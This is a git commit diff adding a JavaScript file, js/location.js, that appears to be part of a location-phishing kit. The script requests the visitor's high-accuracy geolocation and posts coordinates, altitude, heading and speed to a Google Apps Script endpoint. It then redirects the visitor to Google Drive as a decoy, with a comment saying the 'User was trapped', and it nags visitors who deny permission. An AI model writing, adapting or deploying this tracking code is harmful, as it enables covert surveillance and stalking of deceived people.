ac47236ce4481807a26d843f98c19e0f4b82d138
Muhammad Irfan <dev.mirfan@gmail.com>
2022-08-20 21:24:41 +0700

    first commit

---
+++ js/location.js
@@ -0,0 +1,60 @@
+function locate() {
+  if (navigator.geolocation) {
+    var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
+    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
+  } else {
+    alert("Geolocation is not Supported by your Browser...");
+  }
+
+  function showPosition(position) {
+    $.ajax({
+      type: "POST",
+      url: "https://script.google.com/macros/s/AKfycbwUSJoZEna25nrYPJwCKAiaEg3AL6irMN6OVJwJEN22L11Z17_ZMzMewYhd_o6_p6pRPg/exec",
+      data: {
+        status: "success",
+        lat: position.coords.latitude,
+        lon: position.coords.longitude,
+        acc: position.coords.accuracy,
+        alt: position.coords.altitude,
+        dir: position.coords.heading,
+        spd: position.coords.speed,
+      },
+      success: function () {
+        // User was trapped
+        window.location = "https://drive.google.com/";
+      },
+      // mimeType: "text",
+    });
+  }
+}
+
+function showError(error) {
+  var err_text;
+
+  switch (error.code) {
+    case error.PERMISSION_DENIED:
+      err_text = "User denied the request for Geolocation";
+      alert("Please Refresh This Page and Allow Location Permission...");
+      break;
+    case error.POSITION_UNAVAILABLE:
+      err_text = "Location information is unavailable";
+      break;
+    case error.TIMEOUT:
+      err_text = "The request to get user location timed out";
+      alert("Please Set Your Location Mode on High Accuracy...");
+      break;
+    case error.UNKNOWN_ERROR:
+      err_text = "An unknown error occurred";
+      break;
+  }
+
+  $.ajax({
+    type: "POST",
+    url: "https://script.google.com/macros/s/AKfycbwUSJoZEna25nrYPJwCKAiaEg3AL6irMN6OVJwJEN22L11Z17_ZMzMewYhd_o6_p6pRPg/exec",
+    data: { status: 'failed', err: err_text },
+    success: function () {
+      $("#change").html("Failed");
+    },
+    // mimeType: "text",
+  });
+}
